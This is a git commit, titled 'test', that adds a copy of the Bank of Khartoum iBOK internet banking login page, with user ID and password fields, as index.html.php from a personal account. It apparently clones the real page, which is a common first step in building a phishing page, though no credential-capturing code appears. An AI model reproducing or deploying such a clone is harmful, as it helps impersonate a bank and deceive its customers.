b28784d435f678bca42d4d4219f14bd14e24cdd6
bank.mobk <abdallihabdalazem12@gmail.com>
2025-09-05 14:51:57 +0200

    test

---
+++ index.html.php
@@ -0,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charSet="utf-8"/>
+        <meta name="viewport" content="width=device-width, initial-scale=1"/>
+        <link rel="preload" as="image" href="/images/logo.svg"/>
+        <link rel="preload" as="image" href="/images/eye-slash.svg"/>
+        <link rel="preload" as="image" href="/images/footer-logo.svg"/>
+        <link rel="preload" as="image" href="/images/linkidin.svg"/>
+        <link rel="preload" as="image" href="/images/x.svg"/>
+        <link rel="preload" as="image" href="/images/facebook.svg"/>
+        <link rel="stylesheet" href="/_next/static/css/4dc7576c0115df6a.css?dpl=dpl_J4mzKtwsBrwmTCMyijTneHckBpTs" crossorigin="" data-precedence="next"/>
+        <link rel="stylesheet" href="/_next/static/css/84ed7073678d09d4.css?dpl=dpl_J4mzKtwsBrwmTCMyijTneHckBpTs" crossorigin="" data-precedence="next"/>
+        <link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-578b643689be285a.js?dpl=dpl_J4mzKtwsBrwmTCMyijTneHckBpTs" crossorigin=""/>
+        <script src="/_next/static/chunks/fd9d1056-17694c5d0d6a3a92.js?dpl=dpl_J4mzKtwsBrwmTCMyijTneHckBpTs" async="" crossorigin=""></script>
+        <script src="/_next/static/chunks/69-1a341e2a6ae85c46.js?dpl=dpl_J4mzKtwsBrwmTCMyijTneHckBpTs" async="" crossorigin=""></script>
+        <script src="/_next/static/chunks/main-app-f5c8d25c8479457f.js?dpl=dpl_J4mzKtwsBrwmTCMyijTneHckBpTs" async="" crossorigin=""></script>
+        <script src="/_next/static/chunks/app/page-a57c7b83bdced18c.js?dpl=dpl_J4mzKtwsBrwmTCMyijTneHckBpTs" async=""></script>
+        <title>IBok للانترنت المصرفي</title>
+        <meta name="description" content="خدمة بنكك للانترنت المصرفي"/>
+        <link rel="icon" href="/favicon.ico" type="image/x-icon" sizes="256x256"/>
+        <script src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js?dpl=dpl_J4mzKtwsBrwmTCMyijTneHckBpTs" crossorigin="" noModule=""></script>
+    </head>
+    <body>
+        <main>
+            <div _ngcontent-yhq-c72="" _nghost-yhq-c71="">
+                <div _ngcontent-yhq-c71="" class="cssload-container">
+                    <div _ngcontent-yhq-c71="" class="cssload-speeding-wheel"></div>
+                </div>
+            </div>
+            <header _ngcontent-vej-c61="" _nghost-vej-c57="">
+                <div _ngcontent-vej-c57="" class="top-header">
+                    <div _ngcontent-vej-c57="" class="header-logo">
+                        <img _ngcontent-vej-c57="" src="/images/logo.svg" alt="" class="logo-img"/>
+                    </div>
+                    <div _ngcontent-vej-c57="" class="header-text">Welcome to iBOK Internet Banking</div>
+                </div>
+            </header>
+            <div _ngcontent-vej-c61="" class="prelogin">
+                <div _ngcontent-vej-c61="" class="container">
+                    <div _ngcontent-vej-c61="" class="row">
+                        <div _ngcontent-vej-c61="" class="col-lg-6 offset-lg-3">
+                            <div _ngcontent-vej-c61="" class="loginTitle">
+                                <h2 _ngcontent-vej-c61="">Internet Banking - Login</h2>
+                            </div>
+                            <div _ngcontent-vej-c61="" class="loginbox">
+                                <div _ngcontent-vej-c61="" id="login">
+                                    <h3 _ngcontent-vej-c61="">يرجى إدخال التفاصيل</h3>
+                                </div>
+                                <div _ngcontent-vej-c61="" class="loginForm ng-untouched ng-pristine ng-invalid">
+                                    <div _ngcontent-vej-c61="" class="mb-3 mt-3">
+                                        <label _ngcontent-vej-c61="" for="userName">معرّف المستخدم:</label>
+                                        <input _ngcontent-vej-c61="" autoComplete="off" type="number" apponlynumbers="" maxLength="7" placeholder="ادخل معرّف المستخدم" formcontrolname="userID" class="form-control ng-untouched ng-pristine ng-invalid" fdprocessedid="dy93ml" name="userID" value=""/>
+                                        <span _ngcontent-qyj-c61="" class="help-block">
+                                            <span _ngcontent-qyj-c61="" class="help-block"></span>
+                                        </span>
+                                    </div>
+                                    <div _ngcontent-vej-c61="" class="mb-3">
+                                        <label _ngcontent-vej-c61="" for="pwd">كلمة المرور:</label>
+                                        <div _ngcontent-vej-c61="" class="relative">
+                                            <input _ngcontent-vej-c61="" autoComplete="off" type="password" maxLength="16" id="pwd" placeholder="ادخل كلمة المرور" formcontrolname="passWord" apptogglepassword="" class="form-control ng-untouched ng-pristine ng-invalid" fdprocessedid="9myypl" value=""/>
+                                            <img src="/images/eye-slash.svg" class="pass-toggle"/>
+                                        </div>
+                                        <div _ngcontent-vej-c61="" class="row">
+                                            <div _ngcontent-vej-c61="" class="col-lg-8">
+                                                <span _ngcontent-qyj-c61="" class="help-block">
+                                                    <span _ngcontent-qyj-c61="" class="help-block"></span>
+                                                </span>
+                                            </div>
+                                            <div _ngcontent-vej-c61="" class="col-lg-4">
+                                                <div _ngcontent-vej-c61="" class="float-end getPwd" style="display:block">
+                                                    <a _ngcontent-vej-c61="" routerlink="/forgot-password" href="#/forgot-password" style="color:grey">هل نسيت كلمة المرور؟</a>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div _ngcontent-vej-c61="" class="form-check">
+                                        <input _ngcontent-vej-c61="" type="checkbox" class="form-check-input " style="background-color:#bc262a;filter:brightness(90%);appearance:none" checked="" value=""/>
+                                        <label _ngcontent-vej-c61="" for="flexCheckDefault" class="form-check-label">الشروط والأحكام</label>
+                                    </div>
+                                    <div _ngcontent-vej-c61="" class="mt-3">
+                                        <button _ngcontent-vej-c61="" class="btn btn-bok w-100" disabled="">تسجيل الدخول</button>
+                                    </div>
+                                    <div _ngcontent-vej-c61="" class="mt-3"></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div _ngcontent-dtw-c61="" class="footer">
+                <footer _ngcontent-dtw-c58="">
+                    <div _ngcontent-dtw-c58="" class="container">
+                        <div _ngcontent-dtw-c58="" class="row">
+                            <div _ngcontent-dtw-c58="" class="col-md-10">
+                                <div _ngcontent-dtw-c58="" class="copyright">iBOK│Bank of Khartoum 2024</div>
+                            </div>
+                            <div _ngcontent-dtw-c58="" class="col-md-2">
+                                <div _ngcontent-dtw-c58="" class="social-media">
+                                    <div _ngcontent-dtw-c58="" class="soc-ico">
+                                        <a _ngcontent-dtw-c58="" href="https://bankofkhartoum.com/" target="_blank">
+                                            <img _ngcontent-dtw-c58="" src="/images/footer-logo.svg"/>
+                                        </a>
+                                    </div>
+                                    <div _ngcontent-dtw-c58="" class="soc-ico">
+                                        <a _ngcontent-dtw-c58="" href="https://www.linkedin.com/authwall?trk=bf&amp;trkInfo=AQGyUBqFPfZ49gAAAY3FvCugsCdpvi-wQC-2cNQyYy56IDMZj6nwiRtbjrSXg9yeTFWsQyuyjkjQG1Iye-jVooo2WjFhlPQBk3bO8__2Yf5qnI8XiS2aNCsF4XCUT0qMo9xWVro=&amp;original_referer=&amp;sessionRedirect=https%3A%2F%2Fwww.linkedin.com%2Fcompany%2Fbank-of-khartoum%2F" target="_blank">
+                                            <img _ngcontent-dtw-c58="" src="/images/linkidin.svg"/>
+                                        </a>
+                                    </div>
+                                    <div _ngcontent-dtw-c58="" class="soc-ico">
+                                        <a _ngcontent-dtw-c58="" href="https://twitter.com/bankofkhartoum?s=09" target="_blank">
+                                            <img _ngcontent-dtw-c58="" src="/images/x.svg"/>
+                                        </a>
+                                    </div>
+                                    <div _ngcontent-dtw-c58="" class="soc-ico">
+                                        <a _ngcontent-dtw-c58="" href="https://www.facebook.com/BankofKhartoum1913?mibextid=ZbWKwL" target="_blank">
+                                            <img _ngcontent-dtw-c58="" src="/images/facebook.svg"/>
+                                        </a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </footer>
+            </div>
+        </main>
+        <script src="/_next/static/chunks/webpack-578b643689be285a.js?dpl=dpl_J4mzKtwsBrwmTCMyijTneHckBpTs" crossorigin="" async=""></script>
+        <script>
+            (self.__next_f = self.__next_f || []).push([0]);
+            self.__next_f.push([2, null])
+        </script>
+        <script>
+            self.__next_f.push([1, "1:HL[\"/_next/static/css/4dc7576c0115df6a.css?dpl=dpl_J4mzKtwsBrwmTCMyijTneHckBpTs\",\"style\",{\"crossOrigin\":\"\"}]\n0:\"$L2\"\n"])
+        </script>
+        <script>
+            self.__next_f.push([1, "3:HL[\"/_next/static/css/84ed7073678d09d4.css?dpl=dpl_J4mzKtwsBrwmTCMyijTneHckBpTs\",\"style\",{\"crossOrigin\":\"\"}]\n"])
+        </script>
+        <script>
+            self.__next_f.push([1, "4:I[7690,[],\"\"]\n6:I[7831,[],\"\"]\n7:I[1689,[\"931\",\"static/chunks/app/page-a57c7b83bdced18c.js?dpl=dpl_J4mzKtwsBrwmTCMyijTneHckBpTs\"],\"\"]\n8:I[5613,[],\"\"]\n9:I[1778,[],\"\"]\nb:I[8955,[],\"\"]\nc:[]\n"])
+        </script>
+        <script>
+            self.__next_f.push([1, "2:[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/4dc7576c0115df6a.css?dpl=dpl_J4mzKtwsBrwmTCMyijTneHckBpTs\",\"precedence\":\"next\",\"crossOrigin\":\"\"}]],[\"$\",\"$L4\",null,{\"buildId\":\"uSnfzDBAx44_NxKCNqMGC\",\"assetPrefix\":\"\",\"initialCanonicalUrl\":\"/\",\"initialTree\":[\"\",{\"children\":[\"__PAGE__\",{}]},\"$undefined\",\"$undefined\",true],\"initialSeedData\":[\"\",{\"children\":[\"__PAGE__\",{},[\"$L5\",[\"$\",\"$L6\",null,{\"propsForComponent\":{\"params\":{}},\"Component\":\"$7\",\"isStaticGeneration\":true}],null]]},[null,[\"$\",\"html\",null,{\"lang\":\"en\",\"children\":[\"$\",\"body\",null,{\"children\":[\"$\",\"$L8\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"loading\":\"$undefined\",\"loadingStyles\":\"$undefined\",\"loadingScripts\":\"$undefined\",\"hasLoading\":false,\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L9\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":\"404\"}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be found.\"}]}]]}]}]],\"notFoundStyles\":[],\"styles\":[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/84ed7073678d09d4.css?dpl=dpl_J4mzKtwsBrwmTCMyijTneHckBpTs\",\"precedence\":\"next\",\"crossOrigin\":\"\"}]]}]}]}],null]],\"initialHead\":[false,\"$La\"],\"globalErrorComponent\":\"$b\",\"missingSlots\":\"$Wc\"}]]\n"])
+        </script>
+        <script>
+            self.__next_f.push([1, "a:[[\"$\",\"meta\",\"0\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}],[\"$\",\"meta\",\"1\",{\"charSet\":\"utf-8\"}],[\"$\",\"title\",\"2\",{\"children\":\"IBok للانترنت المصرفي\"}],[\"$\",\"meta\",\"3\",{\"name\":\"description\",\"content\":\"خدمة بنكك للانترنت المصرفي\"}],[\"$\",\"link\",\"4\",{\"rel\":\"icon\",\"href\":\"/favicon.ico\",\"type\":\"image/x-icon\",\"sizes\":\"256x256\"}]]\n5:null\n"])
+        </script>
+        <script>
+            self.__next_f.push([1, ""])
+        </script>
+    </body>
+</html>
